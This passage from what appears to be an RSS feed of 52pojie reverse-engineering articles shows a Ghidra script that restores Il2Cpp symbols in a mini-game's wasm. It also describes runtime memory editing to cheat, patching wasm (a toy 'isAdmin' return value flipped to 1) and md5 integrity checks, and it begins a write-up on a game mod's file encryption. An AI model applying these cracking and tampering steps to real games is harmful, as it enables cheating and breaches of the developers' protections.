getCurrentProgram()symbolTable = currentProgram.getSymbolTable()functionManager = currentProgram.getFunctionManager()USER_DEFINED = ghidra.program.model.symbol.SourceType.USER_DEFINED<br />progspace = currentProgram.addressFactory.getAddressSpace(<span style="color: rgb(168, 255, 96);">"ram"</span>)<br />scripts_json_path = askFile(<span style="color: rgb(168, 255, 96);">"script2.json from Il2cppdumper"</span>, <span style="color: rgb(168, 255, 96);">"Open"</span>).absolutePath<br />fd = open(scripts_json_path, <span style="color: rgb(168, 255, 96);">'rb'</span>)<br />Scripts = json.loads(fd.read().decode(<span style="color: rgb(168, 255, 96);">'utf8'</span>))fd.close()processFields = [<br />    <span style="color: rgb(168, 255, 96);">"ScriptMethod"</span>,<br />    <span style="color: rgb(168, 255, 96);">"ScriptString"</span>,<br />    <span style="color: rgb(168, 255, 96);">"ScriptMetadata"</span>,<br />    <span style="color: rgb(168, 255, 96);">"ScriptMetadataMethod"</span>,<br />    <span style="color: rgb(168, 255, 96);">"Addresses"</span>,]<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">extract_parameters</span>(signature):<br />    <span style="color: rgb(146, 255, 184);"># 匹配函数签名中的参数部分</span><br />    params_match = re.search(<span style="color: rgb(168, 255, 96);">r'\((.*?)\)'</span>, signature)<br />    <span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(150, 203, 254);">not</span> params_match:<br />        <span style="color: rgb(150, 203, 254);">return</span> {<span style="color: rgb(168, 255, 96);">"types"</span>: [], <span style="color: rgb(168, 255, 96);">"labels"</span>: [], <span style="color: rgb(168, 255, 96);">"len"</span>: <span style="color: rgb(255, 115, 253);">0</span>}<br />    <span style="color: rgb(146, 255, 184);"># 提取参数部分的内容</span><br />    params_str = params_match.group(<span style="color: rgb(255, 115, 253);">1</span>)<br />    <span style="color: rgb(146, 255, 184);"># 分割参数部分的内容</span><br />    params = params_str.split(<span style="color: rgb(168, 255, 96);">','</span>)<br />    <span style="color: rgb(146, 255, 184);"># 分离参数类型和参数名</span>    types = []    labels = []    name_counter = {}<br />    <span style="color: rgb(150, 203, 254);">for</span> param <span style="color: rgb(150, 203, 254);">in</span> params:        param = param.strip()<br />        <span style="color: rgb(146, 255, 184);"># 查找最后一个空格以分隔类型和名称</span><br />        last_space_index = param.rfind(<span style="color: rgb(168, 255, 96);">' '</span>)<br />        <span style="color: rgb(150, 203, 254);">if</span> last_space_index != -<span style="color: rgb(255, 115, 253);">1</span>:            types.append(param[:last_space_index].strip())<br />            label = param[last_space_index + <span style="color: rgb(255, 115, 253);">1</span>:].strip()<br />            <span style="color: rgb(150, 203, 254);">if</span> label <span style="color: rgb(150, 203, 254);">in</span> name_counter:<br />                name_counter[label] += <span style="color: rgb(255, 115, 253);">1</span>                new_label = label + str(name_counter[label])                labels.append(new_label)<br />            <span style="color: rgb(150, 203, 254);">else</span>:<br />                name_counter[label] = <span style="color: rgb(255, 115, 253);">1</span>                labels.append(label)<br />    <span style="color: rgb(150, 203, 254);">return</span> {<span style="color: rgb(168, 255, 96);">"types"</span>: types, <span style="color: rgb(168, 255, 96);">"labels"</span>: labels, <span style="color: rgb(168, 255, 96);">"len"</span>: len(labels)}<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_addr</span>(addr):<br />    <span style="color: rgb(150, 203, 254);">return</span> progspace.getAddress(addr)<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">set_name</span>(addr, name):<br />    name = name.replace(<span style="color: rgb(168, 255, 96);">' '</span>, <span style="color: rgb(168, 255, 96);">'-'</span>)<br />    createLabel(addr, name, <span style="color: rgb(198, 197, 254);">True</span>, USER_DEFINED)<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">restore_params</span>(func, signature):    params = extract_parameters(signature)<br />    length = params[<span style="color: rgb(168, 255, 96);">'len'</span>]<br />    <span style="color: rgb(150, 203, 254);">if</span> length != func.getParameterCount():<br />        <span style="color: rgb(146, 255, 184);"># print 'Warning: Mismatch function signature: ' + signature</span><br />        <span style="color: rgb(150, 203, 254);">return</span>    parameters = func.getParameters()<br />    <span style="color: rgb(150, 203, 254);">for</span> index <span style="color: rgb(150, 203, 254);">in</span> xrange(length):        p = parameters[index]<br />        <span style="color: rgb(146, 255, 184);"># print length, params['labels']</span><br />        label = params[<span style="color: rgb(168, 255, 96);">'labels'</span>][index]        p.setName(label, USER_DEFINED)<br /><span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(168, 255, 96);">"ScriptMethod"</span> <span style="color: rgb(150, 203, 254);">in</span> Scripts <span style="color: rgb(150, 203, 254);">and</span> <span style="color: rgb(168, 255, 96);">"ScriptMethod"</span> <span style="color: rgb(150, 203, 254);">in</span> processFields:<br />    scriptMethods = Scripts[<span style="color: rgb(168, 255, 96);">"ScriptMethod"</span>]    monitor.initialize(len(scriptMethods))<br />    monitor.setMessage(<span style="color: rgb(168, 255, 96);">"Methods"</span>)<br />    <span style="color: rgb(150, 203, 254);">for</span> scriptMethod <span style="color: rgb(150, 203, 254);">in</span> scriptMethods:<br />        monitor.incrementProgress(<span style="color: rgb(255, 115, 253);">1</span>)<br />        addr = scriptMethod[<span style="color: rgb(168, 255, 96);">"Address"</span>]<br />        name = scriptMethod[<span style="color: rgb(168, 255, 96);">"Name"</span>]<br />        fn_name = scriptMethod[<span style="color: rgb(168, 255, 96);">'FuntionName'</span>]<br />        signature = scriptMethod[<span style="color: rgb(168, 255, 96);">'Signature'</span>]<br />        <span style="color: rgb(150, 203, 254);">for</span> symbol <span style="color: rgb(150, 203, 254);">in</span> symbolTable.getSymbols(fn_name):            addr = symbol.getAddress()<br />            <span style="color: rgb(146, 255, 184);"># 表示已经改过了</span><br />            <span style="color: rgb(150, 203, 254);">if</span> getPlateComment(addr): <span style="color: rgb(150, 203, 254);">continue</span>            set_name(addr, name)<br />            setPlateComment(addr, <span style="color: rgb(168, 255, 96);">'\n'</span>.join([str(addr), fn_name, name, signature]))            restore_params(functionManager.getFunctionAt(addr), signature)<br /><span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(168, 255, 96);">"ScriptString"</span> <span style="color: rgb(150, 203, 254);">in</span> Scripts <span style="color: rgb(150, 203, 254);">and</span> <span style="color: rgb(168, 255, 96);">"ScriptString"</span> <span style="color: rgb(150, 203, 254);">in</span> processFields:<br />    index = <span style="color: rgb(255, 115, 253);">1</span><br />    scriptStrings = Scripts[<span style="color: rgb(168, 255, 96);">"ScriptString"</span>]    monitor.initialize(len(scriptStrings))<br />    monitor.setMessage(<span style="color: rgb(168, 255, 96);">"Strings"</span>)<br />    <span style="color: rgb(150, 203, 254);">for</span> scriptString <span style="color: rgb(150, 203, 254);">in</span> scriptStrings:<br />        addr = get_addr(scriptString[<span style="color: rgb(168, 255, 96);">"Address"</span>])<br />        value = scriptString[<span style="color: rgb(168, 255, 96);">"Value"</span>].encode(<span style="color: rgb(168, 255, 96);">"utf-8"</span>)<br />        name = <span style="color: rgb(168, 255, 96);">"StringLiteral_"</span> + str(index)<br />        createLabel(addr, name, <span style="color: rgb(198, 197, 254);">True</span>, USER_DEFINED)        setEOLComment(addr, value)<br />        index += <span style="color: rgb(255, 115, 253);">1</span><br />        monitor.incrementProgress(<span style="color: rgb(255, 115, 253);">1</span>)<br /><span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(168, 255, 96);">"ScriptMetadata"</span> <span style="color: rgb(150, 203, 254);">in</span> Scripts <span style="color: rgb(150, 203, 254);">and</span> <span style="color: rgb(168, 255, 96);">"ScriptMetadata"</span> <span style="color: rgb(150, 203, 254);">in</span> processFields:<br />    scriptMetadatas = Scripts[<span style="color: rgb(168, 255, 96);">"ScriptMetadata"</span>]    monitor.initialize(len(scriptMetadatas))<br />    monitor.setMessage(<span style="color: rgb(168, 255, 96);">"Metadata"</span>)<br />    <span style="color: rgb(150, 203, 254);">for</span> scriptMetadata <span style="color: rgb(150, 203, 254);">in</span> scriptMetadatas:<br />        addr = get_addr(scriptMetadata[<span style="color: rgb(168, 255, 96);">"Address"</span>])<br />        name = scriptMetadata[<span style="color: rgb(168, 255, 96);">"Name"</span>].encode(<span style="color: rgb(168, 255, 96);">"utf-8"</span>)        set_name(addr, name)        setEOLComment(addr, name)<br />        monitor.incrementProgress(<span style="color: rgb(255, 115, 253);">1</span>)<br /><span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(168, 255, 96);">"ScriptMetadataMethod"</span> <span style="color: rgb(150, 203, 254);">in</span> Scripts <span style="color: rgb(150, 203, 254);">and</span> <span style="color: rgb(168, 255, 96);">"ScriptMetadataMethod"</span> <span style="color: rgb(150, 203, 254);">in</span> processFields:<br />    scriptMetadataMethods = Scripts[<span style="color: rgb(168, 255, 96);">"ScriptMetadataMethod"</span>]    monitor.initialize(len(scriptMetadataMethods))<br />    monitor.setMessage(<span style="color: rgb(168, 255, 96);">"Metadata Methods"</span>)<br />    <span style="color: rgb(150, 203, 254);">for</span> scriptMetadataMethod <span style="color: rgb(150, 203, 254);">in</span> scriptMetadataMethods:<br />        addr = get_addr(scriptMetadataMethod[<span style="color: rgb(168, 255, 96);">"Address"</span>])<br />        name = scriptMetadataMethod[<span style="color: rgb(168, 255, 96);">"Name"</span>].encode(<span style="color: rgb(168, 255, 96);">"utf-8"</span>)<br />        methodAddr = get_addr(scriptMetadataMethod[<span style="color: rgb(168, 255, 96);">"MethodAddress"</span>])        set_name(addr, name)        setEOLComment(addr, name)<br />        monitor.incrementProgress(<span style="color: rgb(255, 115, 253);">1</span>)</code></pre><ul><li style="margin-left: 2px;"><p>当然这么搞也不能完全正确，但是大致是没问题的，大大提升我们分析效率</p></li><li style="margin-left: 2px;"><p>这是脚本执行之后的效果<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=10bd5ad4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlR1emyVZqd0LExKgjljhUJBXgVq1ZEPGhf79XYUJicXTlftIjG6kIt6Gg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>是不是清晰多了</p></li><li style="margin-left: 2px;"><p>还没完<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=132c5b9e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRRzlPdLsGt4EwylkPDqT03ib8IFDPdUbWIUE1Ph6TA773CoavDAY3jUg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>我们还可以通过<code style="font-family: SFMono-Regular, Consolas, ;">Il2CppDumper</code>导出得到的 <code style="font-family: SFMono-Regular, Consolas, ;">dll</code> 来获取它对应的数据结果，这在调试<code style="font-family: SFMono-Regular, Consolas, ;">wasm</code>时很有帮助</p></li></ul><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=efe14d69&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRCe0nDVn2RwMwLQyLYqR0sQibJr1hNSywR4xHsiamkwWj5iaMzysMGq7jg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><ul><li style="margin-left: 2px;"><p>直接拖进<code style="font-family: SFMono-Regular, Consolas, ;">ILSpy</code><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=6f4fef4c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlR9icGf5olAPInG942zM9yH9ibo4BW3x014OcgQa4Z5iaW112W1g0O2eFDw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>这些结构信息和字段偏移很有用的</p></li></ul><h2>开始调试wasm</h2><ul><li style="margin-left: 2px;"><p>假设我现在要找个释放技能的函数 <code style="font-family: SFMono-Regular, Consolas, ;">PlaySkill</code></p></li></ul><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=f8b578dd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRg8Qeicp7jaarIdcfz6FwT1NWzBuweY4SLK7Vus0EvK0ic8SvOfP4u3ew%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />找到了对应的函数，然后我们到 <code style="font-family: SFMono-Regular, Consolas, ;">Ghidra</code> 搜索 <code style="font-family: SFMono-Regular, Consolas, ;">SkillCaster$$PlaySkill</code> （类名$$方法)</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=85bfdf8e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRRM0FuupWGEDcbaibrt4NPxkapReC53dsutG094hXS0CHGUsqXThJXlg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><ul><li style="margin-left: 2px;"><p>然后通过上面注释中的 <code style="font-family: SFMono-Regular, Consolas, ;">j2174</code> 直接在 <code style="font-family: SFMono-Regular, Consolas, ;">wasm</code>中搜索即可 (这里需要开启小程序的<code style="font-family: SFMono-Regular, Consolas, ;">devtools</code>)<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=497ad0ce&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRGiaGtKOow14wWZeasknLMhKZeAj0FictdW2HnQZkMIZLuQpLyddpN5EA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>我这里截图的时候，游戏更新了... 定位变掉了， 这里只做个示例</p></li><li style="margin-left: 2px;"><p>怎么破解游戏这个就只是时间问题了</p></li><li style="margin-left: 2px;"><p>随便下个日志断点，实时修改响应的内存数就行了，当然又能会有内存检查，小心封号哦<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=f1c39702&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRHzavZ6Dtcuh3hvic3kFsj19viakCvEodwrcaT61H6gSGVqVTjINyzIHA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li></ul><h2>如何持久化改动呢 (我还没测试，但是我感觉可行)</h2><ul><li style="margin-left: 2px;"><p>这里我们可以用  <code style="font-family: SFMono-Regular, Consolas, ;">wasm2wat</code> 先转成 wat 再修改，改完再  <code style="font-family: SFMono-Regular, Consolas, ;">wat2wasm</code></p></li></ul><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d62e49b7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRuWYbW843bZo18HM8StfTO5owjLzpoYha5FBIVnvQOWn3couhDqxdtA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><ul><li style="margin-left: 2px;"><p style="margin-bottom: 15px;">写个示例：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">(<span style="color: rgb(150, 203, 254);">module</span><br />(func (export <span style="color: rgb(168, 255, 96);">"isAdmin"</span>) (result <span style="color: rgb(255, 255, 182);">i32</span>)<br />    <span style="color: rgb(255, 255, 182);">i32</span>.const <span style="color: rgb(255, 115, 253);">0</span> <span style="color: rgb(146, 255, 184);">;;  永远返回 0</span>)<br />)</code></pre></li><li style="margin-left: 2px;"><p>编译成 wasm  <code style="font-family: SFMono-Regular, Consolas, ;">wat2wasm test.wat -o test.wasm</code></p></li><li style="margin-left: 2px;"><p>写个<code style="font-family: SFMono-Regular, Consolas, ;">JS</code>跑一下</p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> fs = require(<span style="color: rgb(168, 255, 96);">'fs'</span>)<br />;(<span style="color: rgb(150, 203, 254);">async</span> () =&gt; {<br />  <span style="color: rgb(150, 203, 254);">const</span> {instance} = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">WebAssembly</span>.<span style="color: rgb(255, 255, 182);">instantiate</span>(fs.<span style="color: rgb(255, 255, 182);">readFileSync</span>(<span style="color: rgb(168, 255, 96);">'./aa.wasm'</span>))<br />  <span style="color: rgb(146, 255, 184);">// console.log(instance.exports)</span><br />  <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(instance.exports[<span style="color: rgb(168, 255, 96);">'isAdmin'</span>]())<br />})()</code></pre><ul><li style="margin-left: 2px;"><p>打印 0</p></li><li style="margin-left: 2px;"><p>然后  <code style="font-family: SFMono-Regular, Consolas, ;">wasm2wat test.wam -o test2.wat</code></p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">(module<br />  (<span style="color: rgb(150, 203, 254);">type</span> (;<span style="color: rgb(255, 115, 253);">0</span>;) (<span style="color: rgb(150, 203, 254);">func</span> (result i32)))<br />  (<span style="color: rgb(150, 203, 254);">func</span> (;0;) (<span style="color: rgb(150, 203, 254);">type</span> <span style="color: rgb(255, 115, 253);">0</span>) (result i32)<br />    i32.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">0</span>) ;;  把这里 <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">0</span>  改成 <span style="color: rgb(255, 115, 253);">1</span><br />  (export <span style="color: rgb(168, 255, 96);">"isAdmin"</span> (<span style="color: rgb(150, 203, 254);">func</span> 0)))</code></pre><ul><li style="margin-left: 2px;"><p>重新编译成 wasm  <code style="font-family: SFMono-Regular, Consolas, ;">wat2wasm test.wat -o test.wasm</code></p></li><li style="margin-left: 2px;"><p>再跑一下上面的测试代码</p></li><li style="margin-left: 2px;"><p>打印1了<br /><span style="font-weight: 700;">但是</span><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ac68fb44&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRRH4VVbRnkIwFWlVRY0SKvn8Tic5N1icPiaRqIupDaaFGoettDy6VXekcg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>这里要注意，他里面可能有 <code style="font-family: SFMono-Regular, Consolas, ;">md5</code> 校验</p></li><li style="margin-left: 2px;"><p>好了我写完了，下面贴出相关工具的链接</p></li></ul><h2>相关工具</h2><ol><li style="margin-left: 2px;"><p>unveilr</p></li><li style="margin-left: 2px;"><p>brotli.exe</p></li><li style="margin-left: 2px;"><p>ghidra</p></li><li style="margin-left: 2px;"><p>ghidra-wasm-plugin</p></li><li style="margin-left: 2px;"><p>Il2CppDumper</p></li><li style="margin-left: 2px;"><p>ILSpy</p></li><li style="margin-left: 2px;"><p>watb</p></li><li style="margin-left: 2px;"><p>unityweb.exe</p></li></ol><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=2e3e824c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRgREs9OI663LvaZFab3uaYiapIdsjIB3xB4fPULCmepXn0kXKFOTGUbw%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1936819-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Thu, 04 Jul 2024 15:26:11 +0800</pubDate>
</item>
<item>
<title>记一次某游戏 mod 文件加密逆向过程</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140787&amp;idx=1&amp;sn=ab02eceac3a7241143f61eeb7cd98b85&amp;chksm=bd50a2e78a272bf1f16d5dd5cffec5bcffd1323176f9db75c8aa4ee452f9d48e658b64c541ba&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140787&amp;idx=1&amp;sn=ab02eceac3a7241143f61eeb7cd98b85&amp;chksm=bd50a2e78a272bf1f16d5dd5cffec5bcffd1323176f9db75c8aa4ee452f9d48e658b64c541ba&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-03 18:52</span> <span style="display: inline-block;">北京</span>
</p>

<p>虽然很早注册了论坛账号，但都没怎么实际进行过逆向。这次动手逆向一次某游戏mod文件加密逆向过程，在此分享和大家交流学习一下。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=49151779&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piac3GialjkLVFwcIkr1vKf39tZYRicASS6mZ5yqeT04lo0rypv4bzibJCxmw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>ltr0030</strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p>虽然很早注册了论坛账号，但都没怎么实际进行过逆向。这次动手逆向一次某游戏mod文件加密逆向过程，在此分享和大家交流学习一下。</p><h2>游戏与游戏 mod 背景</h2><p>该游戏为零几年发布的游戏，官方早已不再更新。游戏目前全靠社区制作mod维持活跃。</p><p>一个 mod 由一个 .skudef 描述文件以及一个 .big 资源文件组成。skudef描述文件为纯文本文件，描述了 mod 所需版本号以及所需加载的 big 文件；big 文件为二进制文件，是 mod 代码、图片、音频等文件编译后打包的结果。big 文件可以通过官方工具解包提取其中的音乐和美术资源。</p><p><img border="0" class="rich_pages wxw-img" height="400" src="https://wechat2rss.xlab.app/img-proxy/?k=f18e2c36&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacvhBNE0KgkEticEsw0GCH1BVUTGRYWACuxNnve6FaTPDxsKEyc0TicH1g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="471" /></p><p><br /></p><p>游戏本体有两个可执行文件，一个为游戏启动器，一个为游戏本体。通过在游戏启动器中输入参数，启动器便会将要运行的 mod 以命令行的形式传给游戏本体，从而实现加载 mod 。</p><p>例如只需要在游戏启动器中输入 <code style="font-family: SFMono-Regular, Consolas, ;">-modConfig d:\rael_1.0.skudef</code> 即可启动上图mod。</p><p>co**na 是该游戏由爱好者开发的 mod ，该 mod 完成质量高，在游戏圈内传播广。游玩 co**na 必须通过其网站下载专用的启动器。co**na 由启动器下载真正的mod文件，然后通过专用启动器才可以运行mod。</p><p>为什么玩 mod 还需要专用启动器？不用这个启动器不能玩吗？我带着这个疑问，先分析下这个启动器是如何运行游戏的。</p><h2>对 co**na mod 的初步分析</h2><p>运行游戏发现， co**na 的专用启动器是通过执行游戏自带的启动器，然后再启动游戏的。</p><p>游戏自带启动器支持直接修改传入的命令行参数，很容易发现 co**na 的专用启动器也是通过传入 <code style="font-family: SFMono-Regular, Consolas, ;">-modConfig</code> 命令行参数来运行的。由于 <code style="font-family: SFMono-Regular, Consolas, ;">-modConfig</code> 命令行参数后面紧跟的便是 skudef 文件的路径，可以找到 co**na 真正的mod保存文件夹。</p><p>找到了真正的 mod 文件后，理所当然的，便尝试以普通 mod 的方式启动它。但奇怪的是，进入游戏后，无事发生，mod没有被启动。</p><p>好奇怪，这mod还有什么黑魔法不成？</p><p>通过观察发现，该mod的数据文件并不是游戏规定的big文件，而是一个没有听说过的格式：lyi。如下图：</p><p><img border="0" 